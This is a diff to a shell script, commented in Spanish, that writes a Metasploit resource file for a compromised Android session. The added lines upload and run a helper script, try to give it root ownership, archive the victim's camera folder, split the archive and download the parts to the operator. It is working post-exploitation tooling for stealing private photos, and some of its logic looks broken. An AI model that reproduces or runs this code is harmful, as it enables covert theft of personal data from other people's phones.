@@ -45,11 +45,35 @@ mkdir -p "$DEST_DIR"
 
 # Generar el archivo de recursos de Metasploit
 cat <<EOL > get.rc
-sessions -i $SESSION_ID --timeout 7200
-cd /sdcard/DCIM/Camera
-download * $DEST_DIR
-exit
+echo "Obteniendo información del dispositivo..."
+sessions -interact $SESSION_ID --timeout 7200
+shell
+echo "Cambiando al directorio /sdcard/DCIM"
+cd /sdcard/DCIM
+shell
+echo "Subiendo el script per.sh"
+upload ./utilities/per.sh
+shell
+echo "Dando permisos de ejecución al script per.sh"
+chmod +x per.sh
+shell
+echo "Cambiando el propietario del script per.sh a root (si es posible)"
+chown root:root per.sh || true
+shell
+echo "Ejecutando el script per.sh"
+./per.sh
+shell
+echo "Comprimiendo el directorio Camera"
+tar -czvf Camera.tar.gz Camera
+shell
+echo "Dividiendo el archivo Camera.tar.gz en partes de 50MB"
+split -b 50M Camera.tar.gz Camera.tar.gz.part
+echo "Descargando las partes del archivo Camera.tar.gz"
 EOL
+
+for part in $(ls /sdcard/DCIM/Camera.tar.gz.part*); do
+    echo "download /sdcard/DCIM/$(basename $part) $DEST_DIR/$(basename $part)" >> get.rc
+done
 
 # Ejecutar Metasploit con el archivo de recursos
 resource get.rc
